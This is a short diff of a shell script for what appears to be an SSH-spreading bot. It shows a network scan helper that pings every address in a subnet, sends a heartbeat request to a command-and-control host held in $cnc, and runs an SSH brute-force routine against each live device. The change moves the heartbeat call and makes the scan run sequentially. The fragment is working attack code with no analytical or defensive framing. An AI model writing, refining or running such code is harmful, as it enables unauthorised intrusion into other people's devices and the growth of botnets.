@@ -52,10 +52,10 @@ sshTry()
 # Scan network helper
 is_alive_ping()
 {
+	curl --request GET http://$cnc:$port/heartbeatbot
 	ping -c 1 $1 > /dev/null
 	if [ $? -eq 0 ]
 	then
-		curl --request GET http://$cnc:$port/heartbeatbot
 		echo "Brute forcing the device with IP $1"
 		sshTry $1
 	fi
@@ -66,8 +66,8 @@ nwscan()
 {
 	for i in $1{2..254}
 	do
-		is_alive_ping $i & disown
-		# is_alive_ping $i 
+		# is_alive_ping $i & disown
+		is_alive_ping $i 
 	done
 }
 
